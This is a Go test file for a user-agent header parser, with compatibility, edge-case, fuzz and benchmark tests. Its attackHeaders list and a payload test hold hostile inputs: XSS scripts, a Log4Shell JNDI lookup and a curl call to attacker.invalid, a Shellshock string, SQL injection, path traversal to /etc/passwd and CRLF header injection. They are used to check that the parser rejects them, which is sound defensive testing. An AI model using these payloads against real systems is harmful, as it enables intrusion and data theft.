package useragent

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"testing"
	"unicode/utf8"
)

type compatibilityCase struct {
	Header  string `json:"header"`
	Browser string `json:"browser"`
	OS      string `json:"os"`
}

func upstreamCases(tb testing.TB) []compatibilityCase {
	tb.Helper()

	data, err := os.ReadFile("testdata/upstream.json")
	if err != nil {
		tb.Fatal(err)
	}

	var cases []compatibilityCase
	if err := json.Unmarshal(data, &cases); err != nil {
		tb.Fatal(err)
	}

	if len(cases) != 101 {
		tb.Fatalf("expected 101 upstream browser/OS fixtures, got %d", len(cases))
	}

	return cases
}

func TestUpstreamCompatibility(t *testing.T) {
	t.Parallel()

	for i, tc := range upstreamCases(t) {
		t.Run(fmt.Sprintf("%03d_%s_%s", i, tc.Browser, tc.OS), func(t *testing.T) {
			t.Parallel()

			want := UserAgent{Name: tc.Browser, OS: tc.OS}
			if want.OS == "" {
				want.OS = "Unknown"
			}

			switch want.Name {
			case "BUbiNG", "Discordbot", "Go-http-client", "Konqueror", "Seafile", "SemrushBot", "Twitterbot", "Wget", "facebookcatalog", "facebookexternalhit", "surveyon", "Mozilla/5.0 (Linux; Android 10;)":
				want.Name = "Unknown"
			}

			if got := Parse(tc.Header); got != want {
				t.Fatalf("Parse(%q) = %+v, want %+v", tc.Header, got, want)
			}
		})
	}
}

func TestParseEdgeCases(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name    string
		header  string
		browser string
		os      string
	}{
		{"empty", "", "Unknown", "Unknown"},
		{"spaces", "   ", "Unknown", "Unknown"},
		{"tabs", "\t \t", "Unknown", "Unknown"},
		{"Mozilla only", "Mozilla/5.0", "Unknown", "Unknown"},
		{"unknown product", "UnrecognisedBrowser/123.4", "Unknown", "Unknown"},
		{"OS without browser", "Mozilla/5.0 (Windows NT 10.0)", "Unknown", "Windows"},
		{"browser without OS", "Firefox/130.0", "Firefox", "Unknown"},
		{"unversioned Chrome", "Chrome", "Chrome", "Unknown"},
		{"unversioned Safari", "Safari", "Safari", "Unknown"},
		{"Firefox needs version", "Firefox/", "Unknown", "Unknown"},
		{"Edge needs version", "Chrome/1 Safari/1 Edg/", "Chrome", "Unknown"},
		{"first duplicate wins", "Edg/ Edg/130 Chrome/1", "Chrome", "Unknown"},
		{"first valid duplicate", "Edg/130 Edg/ Chrome/1", "Edge", "Unknown"},
		{"tab separates products", "Chrome/130\tSafari/1\tEdg/130", "Edge", "Unknown"},
		{"tab within OS", "Mozilla/5.0 (Linux; Android\t14) Chrome/130", "Chrome", "Android"},
		{"Android colon separator", "Mozilla/5.0 (Linux; Android:14) Chrome/130", "Chrome", "Android"},
		{"Android colon and space", "Mozilla/5.0 (Linux; Android: 14) Chrome/130", "Chrome", "Android"},
		{"Android before Linux", "Mozilla/5.0 (Linux; Android 14) Chrome/130", "Chrome", "Android"},
		{"Android model product", "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-A310F/A310F) Chrome/130 Safari/1", "Chrome", "Android"},
		{"unrecognised Chromium extension", "Mozilla/5.0 (Linux) Chrome/130 Safari/1 EvilBrowser/1", "Chrome", "Linux"},
		{"iPhone before Macintosh", "Mozilla/5.0 (iPhone; Macintosh) CriOS/130 Safari/1", "Chrome", "iOS"},
		{"iPod", "Mozilla/5.0 (iPod; CPU iPhone OS 15_8 like Mac OS X) Version/15 Safari/605.1", "Safari", "iOS"},
		{"desktop iPad presentation", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) Version/17 Safari/605.1", "Safari", "macOS"},
		{"Windows Phone", "Mozilla/4.0 (Windows Phone OS 7.0; MSIE 7.0)", "Internet Explorer", "Windows Phone"},
		{"Windows precedence", "Mozilla/5.0 (Windows NT 10.0; Windows Phone OS 8.0) Edge/1", "Edge", "Windows"},
		{"ARM64 Chrome OS", "Mozilla/5.0 (X11; CrOS aarch64 13000.0.0) Chrome/130", "Chrome", "ChromeOS"},
		{"iOS Safari", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Version/18 Mobile/15E148 Safari/604.1", "Safari", "iOS"},
		{"iOS Firefox precedence", "Mozilla/5.0 (iPhone) FxiOS/130 Mobile/1 Safari/1", "Firefox", "iOS"},
		{"iOS Edge precedence", "Mozilla/5.0 (iPad) EdgiOS/130 Mobile/1 Safari/1", "Edge", "iOS"},
		{"Android webview", "Mozilla/5.0 (Linux; Android 14; K; wv) Version/4.0 Chrome/130 Mobile Safari/1", "Chrome", "Android"},
		{"Android legacy browser", "Mozilla/5.0 (Android 4.0) Version/4.0", "Android browser", "Android"},
		{"Android legacy version missing", "Mozilla/5.0 (Android 4.0) Version/", "Unknown", "Android"},
		{"Android TikTok", "Mozilla/5.0 (Linux; Android 10; wv) Chrome/88 Safari/1 BytedanceWebview/d8a21c6", "TikTok App", "Android"},
		{"Instagram requires boundary", "InstagramEvil/1 Chrome/130", "Chrome", "Unknown"},
		{"unversioned Instagram", "Instagram", "Instagram App", "Unknown"},
		{"invalid Xiaomi version", "XiaoMi/NotMiuiBrowser/1 Chrome/130", "Chrome", "Unknown"},
		{"case sensitive browser", "chrome/130 SAFARI/1", "Unknown", "Unknown"},
		{"case sensitive OS", "(linux; android 14) Chrome/130", "Chrome", "Unknown"},
		{"exact product name", "NotChrome/130 FakeSafari/1", "Unknown", "Unknown"},
		{"exact OS name", "(NotAndroid 14; NotMacintosh; NotLinux) Chrome/130", "Chrome", "Unknown"},
		{"unclosed comment", "Mozilla/5.0 (Linux; Android 14; Chrome/130", "Chrome", "Android"},
		{"unmatched delimiters", ")];Chrome/130;(Linux", "Chrome", "Linux"},
		{"colon at EOF", "Chrome/130:", "Chrome", "Unknown"},
		{"slash at EOF", "Chrome/", "Chrome", "Unknown"},
		{"URL token ignored", "(+https://example.com/Chrome/130)", "Unknown", "Unknown"},
		{"URL reset before browser", "(+https://example.com) Chrome/130 (Linux)", "Chrome", "Linux"},
		{"HTTP URL reset before browser", "(+http://example.com) Firefox/130 (FreeBSD)", "Firefox", "FreeBSD"},
		{"Unicode model", "Mozilla/5.0 (Linux; Android 14; 日本語 الهاتف) Chrome/130", "Chrome", "Android"},
		{"unknown Unicode product", "ブラウザ/1 (系统)", "Unknown", "Unknown"},
		{"maximum input length", "Chrome/" + strings.Repeat("1", 4089), "Chrome", "Unknown"},
		{"oversize known input", "Chrome/" + strings.Repeat("1", 4090), "Unknown", "Unknown"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			want := UserAgent{Name: tc.browser, OS: tc.os}
			if got := Parse(tc.header); got != want {
				t.Fatalf("Parse(%q) = %+v, want %+v", tc.header, got, want)
			}
		})
	}
}

var attackHeaders = []string{
	`<script>alert(document.cookie)</script>`,
	`<img src=x onerror=alert(1)>`,
	`${jndi:ldap://attacker.invalid/exploit}`,
	`() { ignored; }; echo Content-Type: text/plain; echo pwned`,
	`$(curl https://attacker.invalid/)`,
	"`touch /tmp/owned`",
	`'; DROP TABLE authentications; --`,
	`../../../../etc/passwd`,
	`%0d%0aSet-Cookie: session=attacker`,
	"\x1b[31mChrome/130\x1b[0m",
	"Chrome/130\r\nSet-Cookie: session=attacker",
	"Chrome/130\x00Safari/1",
	"Chrome/130\x7f",
	"Chrome/130\xff",
	"Chrome/130\xc0\xaf",
	"Chrome/130\xed\xa0\x80",
	"\u202eChrome/130",
	"Chrоme/130",
	"Chrome\u200b/130",
	"Chrome\u2028/130",
	"Chrome\u2029/130",
	strings.Repeat("(", 4096),
	strings.Repeat(")", 4096),
	strings.Repeat("/", 4096),
	strings.Repeat(";", 4096),
	strings.Repeat("http://", 585),
	strings.Repeat("a/1;", 1024),
	strings.Repeat("Chrome/130;", 100000),
}

func TestAdversarialHeaders(t *testing.T) {
	t.Parallel()

	for i, header := range attackHeaders {
		t.Run(fmt.Sprintf("attack_%02d", i), func(t *testing.T) {
			t.Parallel()

			want := UserAgent{Name: "Unknown", OS: "Unknown"}
			if got := Parse(header); got != want {
				t.Fatalf("attack %d produced %+v, want %+v", i, got, want)
			}
		})
	}
}

func TestControlBytes(t *testing.T) {
	t.Parallel()

	for c := rune(0); c <= 0x9f; c++ {
		isPrintableASCII := c >= ' ' && c <= '~'
		if c == '\t' || isPrintableASCII {
			continue
		}

		for _, header := range []string{
			string(c) + "Chrome/130 (Linux)",
			"Chrome/130" + string(c) + " (Linux)",
			"Chrome/130 (Linux)" + string(c),
		} {
			if got := Parse(header); got != (UserAgent{Name: "Unknown", OS: "Unknown"}) {
				t.Errorf("control byte %02x: Parse(%q) = %+v", c, header, got)
			}
		}
	}
}

func TestUnicodeFormatCharacters(t *testing.T) {
	t.Parallel()

	for _, c := range []rune{
		'\u200b', '\u200c', '\u200d', '\u202a', '\u202b', '\u202c', '\u202d', '\u202e',
		'\u2066', '\u2067', '\u2068', '\u2069', '\ufeff', '\u2028', '\u2029',
	} {
		for _, header := range []string{
			string(c) + "Chrome/130 (Linux)",
			"Chrome/130" + string(c) + " (Linux)",
			"Chrome/130 (Linux" + string(c) + ")",
		} {
			if got := Parse(header); got != (UserAgent{Name: "Unknown", OS: "Unknown"}) {
				t.Errorf("format character %U: Parse(%q) = %+v", c, header, got)
			}
		}
	}
}

func TestUntrustedProductValuesCannotReachLabels(t *testing.T) {
	t.Parallel()

	for _, payload := range []string{
		`<script>alert(1)</script>`,
		`${jndi:ldap://attacker.invalid/a}`,
		`$(touch-owned)`,
		strings.Repeat("1", 3000),
	} {
		got := Parse("Chrome/" + payload + " (Linux)")
		want := UserAgent{Name: "Chrome", OS: "Linux"}
		if got != want {
			t.Errorf("payload %q: got %+v, want %+v", payload, got, want)
		}
	}
}

func FuzzParse(f *testing.F) {
	for _, tc := range upstreamCases(f) {
		f.Add(tc.Header)
	}

	for _, header := range attackHeaders {
		if len(header) <= 8192 {
			f.Add(header)
		}
	}

	for _, header := range []string{"", ":", "/", "Chrome/1", "Android:", "XiaoMi/MiuiBrowser/1", "\t", strings.Repeat("a", 8192)} {
		f.Add(header)
	}

	f.Fuzz(func(t *testing.T, header string) {
		got := Parse(header)
		if second := Parse(header); got != second {
			t.Fatalf("non-deterministic results: %+v and %+v", got, second)
		}

		for _, label := range []string{got.Name, got.OS} {
			if label == "" || len(label) > 32 || !utf8.ValidString(label) {
				t.Fatalf("invalid label %q", label)
			}

			for _, c := range label {
				if c < ' ' || c > '~' || strings.ContainsRune("<>/\\{}[]()$`'\";", c) {
					t.Fatalf("unsafe character in label %q", label)
				}
			}
		}

		if len(header) > 4096 && got != (UserAgent{Name: "Unknown", OS: "Unknown"}) {
			t.Fatalf("oversized input produced %+v", got)
		}
	})
}

func BenchmarkParse(b *testing.B) {
	cases := map[string]string{
		"desktop":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
		"mobile":          "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
		"many_tokens":     strings.Repeat("a/1;", 1024),
		"deep_delimiters": strings.Repeat("(", 4096),
		"oversized":       strings.Repeat("Chrome/130;", 100000),
	}

	for name, header := range cases {
		b.Run(name, func(b *testing.B) {
			b.ReportAllocs()

			for b.Loop() {
				Parse(header)
			}
		})
	}
}
